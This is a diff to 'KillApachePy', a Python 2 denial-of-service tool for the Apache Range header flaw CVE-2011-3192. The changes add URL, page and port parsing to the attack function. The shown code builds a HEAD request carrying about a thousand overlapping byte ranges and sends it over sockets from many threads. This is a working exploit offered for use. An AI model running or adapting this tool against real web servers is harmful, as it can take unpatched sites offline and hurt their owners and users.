@@ -3,7 +3,7 @@
 import optparse, os, socket, threading, time
 
 NAME    = "KillApachePy (Range Header DoS CVE-2011-3192)"
-VERSION = "0.1a"
+VERSION = "0.1b"
 AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE = "Public domain (FREE)"
 
@@ -12,10 +12,19 @@ RECV_SIZE = 100         # receive buffer size in testing mode
 RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
 
 def attack(target):
+    port = 443 if 'https' in target else 80
+    if '://' in target:
+        target = target[target.find('://') + 3:]
+    if '/' not in target:
+        page = "/"
+    else:
+        target, page = target.split('/', 1)
+        page = "/%s" % page
+    host, port = target.split(':') if ':' in target else (target, 80)
+
     def _send(recv=False):
-        host, port = target.split(':') if ':' in target else (target, 80)
         payload = ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
-        packet = "HEAD / HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (target, payload)
+        packet = "HEAD %s HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (page, target, payload)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, int(port)))
@@ -48,7 +57,7 @@ def attack(target):
                     raise
                 except Exception, msg:
                     if 'new thread' in str(msg):
-                        print "(i) Maximum number of new threads reached (%d)" % len(threads)
+                        print "(i) Maximum number of new threads created (%d)" % len(threads)
                     else:
                         print "(x) Exception occured ('%s')" % msg
                 finally:
